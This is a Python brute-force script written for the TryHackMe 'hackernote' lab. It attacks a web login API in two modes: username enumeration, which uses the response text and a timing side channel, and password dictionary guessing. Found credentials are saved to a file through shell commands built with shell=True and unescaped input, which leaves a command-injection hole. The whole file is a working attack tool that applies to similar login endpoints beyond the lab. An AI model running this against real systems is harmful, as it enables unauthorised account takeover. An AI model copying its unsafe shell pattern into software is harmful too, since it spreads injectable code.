#!/usr/bin/env python
# -*- coding: utf-8 -*-

#tryhackme.com/p/CainSoulless
#Machine: tryhackme.com/room/hackernote

import sys, requests, time, sys, subprocess
from termcolor import colored, cprint

option = ""
if len(sys.argv) < 2:
    print("\nUsage: python3 "+sys.argv[0]+" {IP} {port}\n\nFor example: python3 "+sys.argv[0]+" 10.10.10.10 80")
    sys.exit(1)

print(" ____   ____  __ __  ______    ___  _____   ___   ____      __    ___ \n|    \ |    \|  |  ||      |  /  _]|     | /   \ |    \    /  ]  /  _ ]\n|  o  )|  D  )  |  ||      | /  [_ |   __||     ||  D  )  /  /  /  [_ \n|     ||    /|  |  ||_|  |_||    _]|  |_  |  O  ||    /  /  /  |    _]\n|  O  ||    \|  :  |  |  |  |   [_ |   _] |     ||    \ /   \_ |   [_ \n|     ||  .  \     |  |  |  |     ||  |   |     ||  .  \\     ||     |\n|_____||__|\_|\__,_|  |__|  |_____||__|    \___/ |__|\_| \____||_____|")
print("\nUsage: python3 exploit.py {IP} {port}\n\nFor example: python3 exploit.py 10.10.10.10 80")
time.sleep(1)

while option != "user" and option != "passwd":
    option = input("Dictionary on username or password? ('user' o 'passwd') : ")
    filename = input("Dictionary location: ")
    dic_file = open(filename,"r") 

#Password bruteforce.
if option == "passwd":
    user = input("Username: ")
    
    for lines in dic_file:          #Getting dictionary words.
        line = lines.replace('\n', '')
        credentials = {"password": line, "username": user}
        print(credentials)
        request = requests.post("http://"+sys.argv[1]+":"+sys.argv[2]+"/api/user/login", credentials)
        posts = request.json()          #Sending json request with all the data.

        if posts != {'status': 'Invalid Username Or Password'}:         #Notice crendetial found.
            found = colored("Password Found! = ", "red", attrs=["reverse", "blink"])
            print(found, line)
            try:
                check_output, retornoerror = '',''
                outputtouch = subprocess.check_output("touch usersfound.txt 2> /dev/null", shell=True)
                subprocess.run('echo {}:{} >> usersfound.txt'.format(user,line), shell=True)        #Saving credential found into .txt file

            except subprocess.CalledProcessError as retornoerror:
                if retornoerror.returncode == 1:
                    pass
            break

#User bruteforce
if option == "user":
    for lines in dic_file:
        line = lines.replace('\n', '')
        credentials = {"username": line}

        print(credentials)
        request = requests.post("http://"+sys.argv[1]+":"+sys.argv[2]+"/api/user/login", credentials)
        posts = request.json()
        tiempo = request.elapsed.total_seconds()

        if posts != {'status': 'Invalid Username Or Password'} or tiempo > 1:
            found = colored("User Found! = ", "red", attrs=["reverse", "blink"])
            print(found, line)
            try:
                check_output, retornoerror = '',''
                outputtouch = subprocess.check_output("touch usersfound.txt 2> /dev/null", shell=True)
                subprocess.run('echo {} >> usersfound.txt'.format(line), shell=True)

            except subprocess.CalledProcessError as retornoerror:
                if retornoerror.returncode == 1:
                    pass
